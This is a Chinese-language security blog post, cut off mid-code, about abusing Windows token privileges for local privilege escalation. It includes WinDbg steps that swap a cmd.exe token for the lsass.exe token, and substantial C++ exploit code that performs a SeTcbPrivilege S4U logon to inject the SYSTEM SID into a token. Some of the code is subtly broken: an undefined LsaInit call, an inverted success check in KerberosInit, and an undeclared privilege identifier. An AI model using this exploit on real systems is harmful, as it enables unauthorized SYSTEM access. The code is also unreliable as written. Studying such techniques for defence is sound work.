---
title: Revisiting a Token Privileges Abusing For Windows Local Privilege Escalation
date: 2022-03-29 11:26:00 +0800
author: WHOAMI
toc: true
categories: 域安全
tags: 域安全
layout: post
---

在过去几年中，Windows 内核利用变得越来越复杂，尤其是随着 Windows 10 的发布及其连续的核心更新。除了内核利用之外，还可以通过其他方式滥用令牌特权。在服务帐户遭到破坏且启用了非标准权限的情况下，通常可以利用它们来获得本地特权提升。

执行此操作的方法特定于每种特权。本文整合了不同的资源，为滥用令牌特权的方法提供了完整的参考。

[toc]

# # Token Overview

我们滥用令牌特权的基础源于 Windows 中对象访问控制模型的核心。Windows 使用令牌对象来描述特定线程或进程的安全上下文。这些由 `nt!_TOKEN` 结构表示的令牌对象包含大量安全和参考信息，包括完整性级别、特权、组等。我们的重点在于这些令牌中包含的特权部分。

## Windows Privilege Model

系统上的每个进程都在其 [`EPROCESS`](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess) 结构中持有一个令牌对象引用，以便在对象访问协商或特权系统任务期间使用，如下所示。此令牌在登录过程中通过 LSASS 授予，因此会话中的所有进程最初都在同一令牌下运行。

```ruby
kd> dt _eprocess ffffa88e400d0080
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   // ...
   +0x358 ExceptionPortState : 0y000
   +0x360 Token            : _EX_FAST_REF
   +0x368 MmReserved       : 0
   +0x370 AddressCreationLock : _EX_PUSH_LOCK
   +0x378 PageTableCommitmentLock : _EX_PUSH_LOCK
   +0x380 RotateInProgress : (null) 
   +0x388 ForkInProgress   : (null) 
   // ...
```

一个进程持有一个主令牌，在进程中执行的线程继承这个相同的令牌。当线程需要使用一组不同的凭据访问对象时，它可以使用模拟令牌。使用模拟令牌不会影响主令牌或其他线程，只会在模拟线程的上下文中执行。这些模拟令牌可以通过内核提供的许多不同的 API 获得。

令牌用作进程访问票证，必须提交给 Windows 中的各种看门人，并在访问对象时通过 `SeAccessCheck()` 函数进行评估，在特权操作期间通过 `SeSinglePrivilegeCheck()` 函数进行评估。例如，当进程请求对文件的写访问权时，`SeAccessCheck()` 函数将评估令牌完整性级别，然后评估其自主访问控制列表（DACL）。 当进程试图通过 `NtShutdownSystem()` 关闭系统时，内核将评估请求进程令牌是否启用了 `SeShutdownPrivilege` 特权。

## Token Structure and Privileges

如前所述，`_TOKEN` 结构主要包含有关进程或线程的安全上下文信息，如下所示：

```ruby
kd> dt _TOKEN ffff838b73a1a6b0
nt!_TOKEN
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER 0x7fffffff`ffffffff
   +0x030 TokenLock        : 0xffffa88e`3fccb590 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : 1
   +0x07c UserAndGroupCount : 0x13
   +0x080 RestrictedSidCount : 0
   +0x084 VariableLength   : 0x2a4
   +0x088 DynamicCharged   : 0x1000
   +0x08c DynamicAvailable : 0
   +0x090 DefaultOwnerIndex : 4
   +0x098 UserAndGroups    : 0xffff838b`73a1ab40 _SID_AND_ATTRIBUTES
   +0x0a0 RestrictedSids   : (null) 
   +0x0a8 PrimaryGroup     : 0xffff838b`740c1b10 Void
   +0x0b0 DynamicPart      : 0xffff838b`740c1b10  -> 0x501
   +0x0b8 DefaultDacl      : 0xffff838b`740c1b2c _ACL
   +0x0c0 TokenType        : 1 ( TokenPrimary )
   +0x0c4 ImpersonationLevel : 0 ( SecurityAnonymous )
   +0x0c8 TokenFlags       : 0x2000
   +0x0cc TokenInUse       : 0x1 ''
   +0x0d0 IntegrityLevelIndex : 0x12
   +0x0d4 MandatoryPolicy  : 3
   +0x0d8 LogonSession     : 0xffff838b`720fc840 _SEP_LOGON_SESSION_REFERENCES
   +0x0e0 OriginatingLogonSession : _LUID
   +0x0e8 SidHash          : _SID_AND_ATTRIBUTES_HASH
   +0x1f8 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH
   +0x308 pSecurityAttributes : 0xffff838b`7163e6d0 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
   +0x310 Package          : (null) 
   +0x318 Capabilities     : (null) 
   +0x320 CapabilityCount  : 0
   +0x328 CapabilitiesHash : _SID_AND_ATTRIBUTES_HASH
   +0x438 LowboxNumberEntry : (null) 
   +0x440 LowboxHandlesEntry : (null) 
   +0x448 pClaimAttributes : (null) 
   +0x450 TrustLevelSid    : (null) 
   +0x458 TrustLinkedToken : (null) 
   +0x460 IntegrityLevelSidValue : (null) 
   +0x468 TokenSidValues   : (null) 
   +0x470 IndexEntry       : 0xffff838b`7281a370 _SEP_LUID_TO_INDEX_MAP_ENTRY
   +0x478 DiagnosticInfo   : (null) 
   +0x480 BnoIsolationHandlesEntry : (null) 
   +0x488 SessionObject    : 0xffffa88e`3a33e180 Void
   +0x490 VariablePart     : 0xffff838b`73a1ac70
```

我们关注的重点是该结构中的 `_SEP_TOKEN_PRIVILEGES` 条目，位于 0x40 偏移量处，包含令牌特权信息：

```ruby
kd> dt nt!_SEP_TOKEN_PRIVILEGES ffff838b73a1a6b0+0x40
   +0x000 Present          : 0x0000001e`73deff20
   +0x008 Enabled          : 0x60800000
   +0x010 EnabledByDefault : 0x60800000
```

`Present` 条目是一个 unsigned long long 型，其中包含令牌的当前特权。这并不意味着它们被启用或禁用，而只是它们存在于令牌上。创建令牌后，您无法为其添加特权，而只能启用或禁用在此字段中找到的现有项。第二个字段 `Enabled` 也是一个 unsigned long long 型，其中包含令牌上所有已启用的特权。特权必须在此位掩码中启用才能通过 `SeSinglePrivilegeCheck()` 的评估。最后一个字段 `EnabledByDefault` 表示令牌在构造时的默认状态。可以通过调整这些字段中的特定位来启用或禁用特权。

尽管从表面上看，为各种任务定义特定特权的令牌安全模型似乎允许实施特定于服务的细粒度访问控制，但仔细观察会发现更复杂的情况。许多权限在启用时允许用户执行可导致权限提升的特权操作。 

## Enable Privileges for Process

通过 Windows 的 `AdjustTokenPrivileges()` 函数，能够启用或禁用指定访问令牌中的特权。在访问令牌中启用或禁用特权需要 `TOKEN_ADJUST_PRIVILEGES` 访问权限。如下给出示例代码。

```c++
#include <Windows.h>
#include <stdio.h>

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}

int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}

	// Enable SeDebugPrivilege for the current process token.
	if (!EnableTokenPrivilege(hToken, SeDebugPrivilege))
	{
		wprintf(L"[-] Failed to enable privilege.\n", GetLastError());
		return 0;
	}
}
```

## Token Impersonation

在深入研究特权之前，我们先介绍一下 “令牌模拟级别” 得概念描述，这是用于确定特定线程是否可以使用给定令牌的 Windows 机制。任何用户都可以获得特权令牌的句柄，但能否实际使用它是另一回事。

在 Windows 中，“令牌模拟” 是指将新令牌分配给不同于父进程令牌的线程。尽管 “模拟” 一词暗示一个用户正在使用属于另一个用户的令牌，但情况并非总是如此。用户可以模拟属于他们的令牌，但只是具有一组不同的特权或一些其他修改。

每个令牌中的 ImpersonationLevel 字段是令牌模拟级别，该字段控制该令牌是否可用于模拟目的以及在何种程度上进行模拟。有以下四种模拟级别：

|        模拟级别        |                             说明                             |
| :--------------------: | :----------------------------------------------------------: |
|   SecurityAnonymous    |    服务器进程无法获取客户端的身份信息，也无法模拟客户端。    |
| SecurityIdentification |     服务器可以获得客户端的身份和权限，但不能模拟客户端。     |
| SecurityImpersonation  | 服务器进程可以在其本地系统上模拟客户端的安全上下文。服务器无法模拟远程系统上的客户端。 |
|   SecurityDelegation   |      服务器进程可以在远程系统上模拟客户端的安全上下文。      |

SecurityImpersonation 和 SecurityDelegation 是我们最感兴趣的模拟级别，而 SecurityIdentification 级别及更低级别的令牌不能用于运行代码。

对于是否允许给定用户模拟特定令牌，可以确定如下规则：

> - IF the token level < Impersonate THEN allow (such tokens are called “Identification” level and can not be used for privileged actions).  
> - IF the process has “Impersonate” privilege THEN allow.  
> - IF the process integrity level >= the token integrity level AND the process user == token user THEN allow ELSE restrict the token to “Identification” level (no privileged actions possible).

## Use WinDbg to modify the token of the process to elevate privileges

我们以 cmd.exe 进程为例，将普通用户启动的 cmd.exe 进程的 Token，替换为 SYSTEM 权限进程的 Token，以提升 cmd.exe 进程的权限。

首先以普通用户 Marcus 启动一个 cmd.exe 进程，如下图所示。

![image-20230619202940652](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230619202940652.png)

在 WinDbg 中找到该进程的地址并列出相关信息：

```cmd
!process 0 1 cmd.exe
```

![image-20230619203338052](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230619203338052.png)

可以看到该进程的 `EPROCESS` 结构地址为 `ffffb1863f6b2080`，查看该进程的 `EPROCESS` 结构：

```cmd
dt _eprocess ffffb1863f6b2080
```

![image-20230619203727523](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230619203727523.png)

可知该进程的 Token 在 `EPROCESS` 结构的 `0x360` 偏移处，查看该进程的 Token:

```cmd
dd ffffb1863f6b2080+0x360
```

![image-20230619203909416](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230619203909416.png)

同理，我们可以得到 lsass.exe 进程的 Token，地址为 `ffffb1863bda8080+0x360`：

```
dd ffffb1863bda8080+0x360
```

![image-20230619204152580](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230619204152580.png)

最后，用 lsass.exe 进程的 Token 替换 cmd.exe 进程的 Token：

```cmd
ed ffffb1863f6b2080+0x360 0e1d30a4
```

![image-20230619204425805](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230619204425805.png)

如下图所示，cmd.exe 进程的权限成功提升至 SYSTEM。

![image-20230619204522895](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230619204522895.png)

# # Abusing Token Privileges

出于本文的目的，我们将可以单独使用以获得目标系统的 NT AUTHORITY\SYSTEM 级别访问权限的任何令牌特权定义为 “可利用特权”。

正如在前文中提到的，`nt!_SEP_TOKEN_PRIVILEGES` 结构是令牌中的一个二进制字段，其中每一位确定给定的特权是否存在或在令牌中是否启用。

本节的其余部分将详细介绍我们能够成功滥用以获得提升的特权的每种特权。该项目包含利用每一种特权的代码示例。

## SeImpersonatePrivilege  *

SeImpersonatePrivilege 在 Microsoft 官方文档中被描述为 “*Impersonate a client after authentication*”，拥有此特权的任何进程都可以模拟它能够获得句柄的任何令牌。但是，此特权不允许创建新令牌。

这个特殊权限非常有趣，因为许多常见的 Windows 服务帐户都需要它，例如 LocalService 以及用于 MSSQL 和 IIS 的帐户。如果任何此类帐户受到威胁，则对该特权的利用就会导致特权提升。

熟悉 “Potato” 系列提权的朋友应该知道，它们早期的利用思路几乎都是相同的，就是想方设法获取 NT AUTHORITY\SYSTEM 帐户的令牌句柄。例如，利用 COM 接口的一些特性，欺骗 NT AUTHORITY\SYSTEM 账户连接并验证到攻击者控制的 TCP 侦听器。通过一系列 API 调用对这个认证过程执行中间人（NTLM Relay）攻击，以在本地计算机上为 NT AUTHORITY\SYSTEM 账户创建一个访问令牌。

任何用户都可以执行前面描述的过程来获得 NT AUTHORITY\SYSTEM 帐户的令牌句柄，但是为了使用这个句柄，需要模拟的能力，而 SeImpersonatePrivilege 特权正好允许我们这样做。使用提升的令牌生成新进程需要调用的 `CreateProcessWithTokenW()` 函数，将新令牌作为第一个参数传递。

## SeAssignPrimaryTokenPrivilege *

SeAssignPrimaryTokenPrivilege 特权在攻击面上与前面讨论的 SeImpersonatePrivilege 非常相似，它被描述为 “*Assign the primary token of a process*”，拥有该特权的任何进程都可以将主令牌分配给指定的进程。该特权的利用策略是使用提升的令牌生成一个新进程。

为了创建具有特权令牌的新进程，我们首先需要获取此类令牌的句柄。为此，我们遵循 “SeImpersonatePrivilege” 节中描述的过程。

正如此特权的名称所暗示的那样，它允许我们将主令牌分配给新的或挂起的进程。使用 “SeImpersonatePrivilege” 节中概述的策略来获取令牌，此时已经拥有一个特权模拟令牌，因此需要首先从中派生出一个主令牌。这可以通过 `DuplicateTokenEx()` 函数来完成：

```c++
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &phNewToken)
```

有了特权主令牌，我们现在有几个选择。不幸的是，我们不能简单地将当前正在运行的进程的令牌替换为提升的进程，因为不支持更改正在运行的进程上的主要令牌的行为。这是由 `EPROCESS` 结构中的 `PrimaryTokenFrozen` 字段控制的。

最简单的选择是使用新令牌作为参数调用 `CreateProcessAsUser` 函数来创建一个新的、高特权的进程。或者，我们可以在挂起状态下生成一个新进程并执行与上述相同的操作，当通过指定 `CREATE_SUSPENDED` 标志创建新进程时，`PrimaryTokenFrozen` 的值尚未设置，允许替换令牌。

## SeTcbPrivilege

SeTcbPrivilege 特权非常有趣， Microsoft 官方文档中被描述为 “Act as part of the operating system”，除此之外，许多书籍、文章和论坛帖子都将 SeTcbPrivilege 特权描述为等同于对机器的完全特权访问。拥有该特权的任何进程可以调用 `LsaLogonUser()` 函数执行创建登录令牌等操作，因此可以充当任意用户。

通常，`LsaLogonUser()` 函数用于使用某种形式的凭据对用户进行身份验证。在  Microsoft 官方文档中， `LsaLogonUser()` 函数定义如下。

```c++
NTSTATUS LsaLogonUser(
  [in]           HANDLE              LsaHandle,
  [in]           PLSA_STRING         OriginName,
  [in]           SECURITY_LOGON_TYPE LogonType,
  [in]           ULONG               AuthenticationPackage,
  [in]           PVOID               AuthenticationInformation,
  [in]           ULONG               AuthenticationInformationLength,
  [in, optional] PTOKEN_GROUPS       LocalGroups,
  [in]           PTOKEN_SOURCE       SourceContext,
  [out]          PVOID               *ProfileBuffer,
  [out]          PULONG              ProfileBufferLength,
  [out]          PLUID               LogonId,
  [out]          PHANDLE             Token,
  [out]          PQUOTA_LIMITS       Quotas,
  [out]          PNTSTATUS           SubStatus
);
```

- [in] LsaHandle：指定从上一次调用 `LsaRegisterLogonProcess()` 函数获得的句柄。
- [in] OriginName：标识登录尝试的源的字符串。
- [in] LogonType：指定所请求登录类型的 [SECURITY_LOGON_TYPE](https://learn.microsoft.com/zh-cn/windows/desktop/api/ntsecapi/ne-ntsecapi-security_logon_type) 枚举的值。 如果 LogonType 是 Interactive 或 Batch，则会生成主令牌来表示新用户。 如果 LogonType 是 Network，则会生成模拟令牌。
- [in] AuthenticationPackage：用于身份验证的身份验证包的标识符。可以通过调用 [LsaLookupAuthenticationPackage](https://learn.microsoft.com/zh-cn/windows/desktop/api/ntsecapi/nf-ntsecapi-lsalookupauthenticationpackage) 函数来获取此值。
- [in] AuthenticationInformation：指向包含身份验证信息的输入缓冲区的指针，例如用户名和/或密码。此缓冲区的格式和内容由身份验证包确定。
- [in] AuthenticationInformationLength：指定 AuthenticationInformation 缓冲区的长度（以字节为单位）。
- [in, optional] LocalGroups：要添加到经过身份验证的用户令牌中的附加组标识符列表。这些组标识符将与默认组 WORLD 和登录类型组（交互式、批处理或网络）一起添加到每个用户令牌中。
- [in] SourceContext：标识源模块（例如会话管理器）的 [TOKEN_SOURCE](https://learn.microsoft.com/zh-cn/windows/desktop/api/winnt/ns-winnt-token_source) 结构，以及可能对该模块有用的上下文。此信息包含在用户令牌中，可以通过调用 [GetTokenInformation](https://learn.microsoft.com/zh-cn/windows/desktop/api/securitybaseapi/nf-securitybaseapi-gettokeninformation) 函数进行检索。
- [out] ProfileBuffer：指向 void 指针的指针，用于接收包含身份验证信息的输出缓冲区的地址，例如登录 shell 和主目录。
- [out] ProfileBufferLength：指向 ULONG 的指针，该 ULONG 接收返回的配置文件缓冲区的长度（以字节为单位）。
- [out] LogonId：指向接收唯一标识登录会话的 LUID 的缓冲区的指针。此 LUID 由对登录信息进行身份验证的域控制器分配。
- [out] Token：指向接收为此会话创建的新用户令牌的句柄的指针。使用完令牌后，通过调用 [CloseHandle](https://learn.microsoft.com/zh-cn/windows/desktop/api/handleapi/nf-handleapi-closehandle) 函数释放该令牌。
- [out] Quotas：返回主令牌时，此参数会收到一个 [QUOTA_LIMITS](https://learn.microsoft.com/zh-cn/windows/desktop/api/winnt/ns-winnt-quota_limits) 结构，该结构包含分配给新登录用户的初始进程的进程配额限制。
- [out] SubStatus：如果由于帐户限制而登录失败，此参数将收到有关登录失败的原因的信息。仅当用户的帐户信息有效且登录被拒绝时，才会设置此值。

在 Microsoft 官方文档中，我们注意到，当以下一项或多项为 True 时，调用方需要具有 SeTcbPrivilege：

1. 使用子身份验证包。
2. 使用 KERB_S4U_LOGON，调用方请求模拟令牌。
3. `LocalGroups` 参数不是 NULL。

这里我们主要关注第 2、3 点，从文档描述来看，如果使用 KERB_S4U_LOGON（该结构包含有关用户（S4U）登录的服务的信息）来登录，那么我们作为调用者就可以拿到一张模拟令牌，如下图所示。

![image-20230703192650002](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230703192650002.png)

此外，MSV1_0_S4U_LOGON 结构也是可以的，只是文档中没有体现。并且，如果使用 KERB_S4U_LOGON，则调用方必须是域帐户。这两个的结构的语法如下所示。

- KERB_S4U_LOGON

```c++
typedef struct _KERB_S4U_LOGON {
    KERB_LOGON_SUBMIT_TYPE MessageType;
    ULONG Flags;
    UNICODE_STRING ClientUpn;   // REQUIRED: UPN for client
    UNICODE_STRING ClientRealm; // Optional: Client Realm, if known
} KERB_S4U_LOGON, *PKERB_S4U_LOGON;
```

- MSV1_0_S4U_LOGON

```c++
typedef struct _MSV1_0_S4U_LOGON {
    MSV1_0_LOGON_SUBMIT_TYPE MessageType;
    ULONG Flags;
    UNICODE_STRING UserPrincipalName; // username or username@domain
    UNICODE_STRING DomainName; // Optional: if missing, using the local machine
} MSV1_0_S4U_LOGON, *PMSV1_0_S4U_LOGON;
```

但是，在实际操作中，我们又该尝试登录哪个用户？此外，如果我们没有 SeImpersonatePrivilege 特权，我们又将如何模拟生成的令牌？

值得庆幸的是，James Forshaw 曾说话一句非常关键的话：

> “*you could use LsaLogonUser to add admin group to a token of your own user, then impersonate.*” 

也就是说，我们可以使用 `LsaLogonUser()` 函数将管理员组或本地系统帐户组添加到您自己用户的令牌中，然后进行模拟。

这似乎非常符合我们正在努力做的事情，使用 S4U 登录类型，我们可以获得任何用户的令牌。回顾上面 `[in] LogonType` 参数的描述，如果我们有 SeTcbPrivilege 特权，显然生成的令牌可以是模拟令牌，这意味着我们可以将它分配给线程。

我们可以将 “S-1-5-18” 组 SID 添加到结果令牌，这是本地系统帐户的 SID，如果我们使用这个令牌，我们将拥有系统的全部权限。添加 SYSTEM 帐户的 SID 非常简单，就是操作 `LsaLogonUser()` 的 `LocalGroups` 参数：

```c++
WCHAR systemSID[] = L"S-1-5-18"; 
ConvertStringSidToSid(systemSID, &pExtraSid);

pGroups->Groups[pGroups->GroupCount].Attributes = 
                    SE_GROUP_ENABLED | SE_GROUP_MANDATORY; 
pGroups->Groups[pGroups->GroupCount].Sid = pExtraSid;
pGroups->GroupCount++;
```

这个难题中唯一剩下的部分是我们将如何使用生成的模拟令牌，因为我们假设我们只拥有 SeTcbPrivilege 特权，没有其他与模拟相关的特权。回顾前文有关令牌模拟的相关规则，只要令牌是给我们当前用户的，并且完整性级别小于或等于当前进程完整性级别，我们就应该能够在没有任何特殊权限的情况下模拟令牌。令牌的完整性级别可以在构造令牌时设置。因此，使用 `LsaLogonUser()` 返回的令牌，我们只需将完整性级别设置为 “Medium”，然后调用 `SetThreadToken()` 函数将当前线程的令牌替换为新令牌即可。

如下图所示，本地用户 John 拥有 SeTcbPrivilege 特权。

![image-20230704153527922](C:\Users\whoami\AppData\Roaming\Typora\typora-user-images\image-20230704153527922.png)

我们可以通过 `LsaLogonUser()` 函数执行 S4U 登录，并为 John 账户生成一张模拟令牌，最终使用该令牌创建线程，实现提权。下面给出可供参考的利用代码。

### Main

首先通过 `GetCurrentProcess()` 和 `OpenProcessToken()` 函数打开当前进程的句柄，如下所示。

```c++
int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}

	// Enable SeTcbPrivilege for the current process token.
	if (EnableTokenPrivilege(hToken, SE_TCB_NAME))
	{
		if (NT_SUCCESS(DoS4U(hToken)))
		{
			return 1;
		}
	}
}
```

然后调用 `EnableTokenPrivilege()` 函数，该函数通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeTcbPrivilege 特权，如下所示。

```c++
BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}
```

然后直接调用 `DoS4U()` 函数，在该函数中执行 S4U 登录等操作。

### DoS4U

`DoS4U()` 函数的内容如下：

```c++
NTSTATUS DoS4U(HANDLE hToken)
{
	NTSTATUS status = 0;
	NTSTATUS subStatus = 0;
	HANDLE hThread = NULL;
	HANDLE phNewToken = NULL;
	PTOKEN_GROUPS pGroups = NULL;
	PSID pLogonSid = NULL;
	PSID pExtraSid = NULL;
	DWORD dwMsgS4ULength;

	PBYTE pbPosition;

	DWORD dwProfile = 0;
	LUID logonId = { 0 };
	ULONG profileBufferLength;
	PVOID profileBuffer;
	QUOTA_LIMITS quotaLimits;
	HANDLE hTokenS4U = NULL;
	PVOID pvProfile = NULL;

	LSA_STRING OriginName = { 15, 16, (PCHAR)"S4U for Windows" };
	PMSV1_0_S4U_LOGON pS4uLogon = NULL;
	TOKEN_SOURCE TokenSource;

	TOKEN_MANDATORY_LABEL TIL = { 0 };

	LPCWSTR szDomain = L".";
	LPCWSTR szUsername = L"John";//the user who has SeTcbPrivilege

	WCHAR systemSID[] = L"S-1-5-18";
	ConvertStringSidToSidW(systemSID, &pExtraSid);

	WCHAR mediumInt[] = L"S-1-16-8192";
	PSID mediumSID = NULL;
	ConvertStringSidToSidW(mediumInt, &mediumSID);

	HANDLE hThreadToken = NULL;
	PTOKEN_MANDATORY_LABEL pTokenIntegrityLevel = NULL;
	DWORD dwLength;
	LPWSTR lpGroupSid;

	if (!GetLogonSID(hToken, &pLogonSid))
	{
		wprintf(L"[-] Unable to find logon SID.\n");
		goto Clear;
	}

	if (!NT_SUCCESS(LsaInit()))
	{
		wprintf(L"[-] Failed to start kerberos initialization.\n");
		goto Clear;
	}

	wprintf(L"[*] Initialize S4U login.\n");
	// Create MSV1_0_S4U_LOGON structure
	dwMsgS4ULength = sizeof(MSV1_0_S4U_LOGON) + (EXTRA_SID_COUNT + (DWORD)wcslen(szDomain) + (DWORD)wcslen(szUsername)) * sizeof(WCHAR);
	pS4uLogon = (PMSV1_0_S4U_LOGON)LocalAlloc(LPTR, dwMsgS4ULength);
	if (pS4uLogon == NULL)
	{
		wprintf(L"[-] LocalAlloc Error: [%u].", GetLastError());
		goto Clear;
	}

	pS4uLogon->MessageType = MsV1_0S4ULogon;
	pbPosition = (PBYTE)pS4uLogon + sizeof(MSV1_0_S4U_LOGON);
	pbPosition = InitUnicodeString(&pS4uLogon->UserPrincipalName, szUsername, pbPosition);
	pbPosition = InitUnicodeString(&pS4uLogon->DomainName, szDomain, pbPosition);

	strcpy_s(TokenSource.SourceName, TOKEN_SOURCE_LENGTH, "User32");
	AllocateLocallyUniqueId(&TokenSource.SourceIdentifier);

	// Add extra SID to token.
	// If the application needs to connect to a Windows Desktop, Logon SID must be added to the Token.
	wprintf(L"[*] Add extra SID S-1-5-18 to token.\n");
	pGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, sizeof(TOKEN_GROUPS) + 2 * sizeof(SID_AND_ATTRIBUTES));
	if (pGroups == NULL)
	{
		wprintf(L"[-] LocalAlloc Error: [%u].", GetLastError());
		goto Clear;
	}

	// Add Logon Sid, if present.
	if (pLogonSid)
	{
		pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
		pGroups->Groups[pGroups->GroupCount].Sid = pLogonSid;
		pGroups->GroupCount++;
	}

	// If an extra SID is specified to command line, add it to the pGroups structure.
	pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
	pGroups->Groups[pGroups->GroupCount].Sid = pExtraSid;
	pGroups->GroupCount++;

	//pGroups = NULL;

	// Call LSA LsaLogonUser
	// This call required SeTcbPrivilege privilege:
	//    - [1] to get a primary token (vs impersonation token). The privilege MUST be activated.
	//    - [2] to add supplemental SID with LocalGroups parameter.
	//    - [3] to use a username with a domain name different from machine name (or '.').

	status = LsaLogonUser(
		hLSA,
		&OriginName,
		Network,                // Or Batch
		ulAuthenticationPackage,
		pS4uLogon,
		dwMsgS4ULength,
		pGroups,                // LocalGroups
		&TokenSource,           // SourceContext
		&pvProfile,
		&dwProfile,
		&logonId,
		&hTokenS4U,
		&quotaLimits,
		&subStatus
	);
	if (status != STATUS_SUCCESS)
	{
		wprintf(L"[-] LsaLogonUser Error: [0x%x].", status);
		goto Clear;
	}

	wprintf(L"[*] Set the token integrity level to medium.\n");

	TIL.Label.Attributes = SE_GROUP_INTEGRITY;
	TIL.Label.Sid = mediumSID;

	if (!SetTokenInformation(hTokenS4U, TokenIntegrityLevel, &TIL, sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(mediumSID)))
	{
		wprintf(L"[-] SetTokenInformation Error: [%u].\n", GetLastError());
	}

	hThread = GetCurrentThread();
	
	if (!SetThreadToken(&hThread, hTokenS4U))
	{
		wprintf(L"[-] SetThreadToken Error: [%u].\n", GetLastError());
	}
	
	wprintf(L"[*] LsaLogonUser successfully and get S4U token: \n\n");

	if (!DisplayTokenInformation(hTokenS4U))
	{
		wprintf(L"[-] Failed to get S4U token information.\n");
	}

	wprintf(L"\n[*] Successfully impersonated S4U.\n");
	ExploitSeTcbPrivilege();

	goto Clear;

Clear:
	if (OriginName.Buffer)
		LocalFree(OriginName.Buffer);
	if (pLogonSid)
		LocalFree(pLogonSid);
	if (pExtraSid)
		LocalFree(pExtraSid);
	if (pS4uLogon)
		LocalFree(pS4uLogon);
	if (pGroups)
		LocalFree(pGroups);
	if (hLSA)
		LsaClose(hLSA);
	if (hToken)
		CloseHandle(hToken);
	if (hTokenS4U)
		CloseHandle(hTokenS4U);
	
	return status;
}
```

该函数首先调用 `LsaInit()` 函数执行 Lsa 初始化的过程。其首先通过 `LsaConnectUntrusted()` API 函数与 LSA 服务器建立不受信任的连接，然后通过 `LsaLookupAuthenticationPackage()` API 获取 MSV1_0 身份验证包的唯一标识符，如下所示。

```c++
LSA_STRING MSV1_0_PackageName = { 37, 38, (PCHAR)MSV1_0_PACKAGE_NAME };
ULONG	ulAuthenticationPackage = 0;
BOOL	isAuthPackageKerberos = FALSE;
HANDLE	hLSA = NULL;

NTSTATUS KerberosInit()
{
	NTSTATUS status = 0;
	// Open LSA policy handle
	status = LsaConnectUntrusted(&hLSA);
	if (status != STATUS_SUCCESS)
	{
		// Lookup authentication package ID
		status = LsaLookupAuthenticationPackage(hLSA, &MSV1_0_PackageName, &ulAuthenticationPackage);
		isAuthPackageKerberos = NT_SUCCESS(status);
	}
	return status;
}
```

Lsa 初始化完成后，初始化 S4U 登录，主要是初始化 `MSV1_0_S4U_LOGON` 结构体，并设置要登陆的用户名（这里是 John）和域名，如下所示。

```c++
// Create MSV1_0_S4U_LOGON structure
dwMsgS4ULength = sizeof(MSV1_0_S4U_LOGON) + (EXTRA_SID_COUNT + (DWORD)wcslen(szDomain) + (DWORD)wcslen(szUsername)) * sizeof(WCHAR);
pS4uLogon = (PMSV1_0_S4U_LOGON)LocalAlloc(LPTR, dwMsgS4ULength);
if (pS4uLogon == NULL)
{
  wprintf(L"[-] LocalAlloc Error: [%u].", GetLastError());
  goto Clear;
}

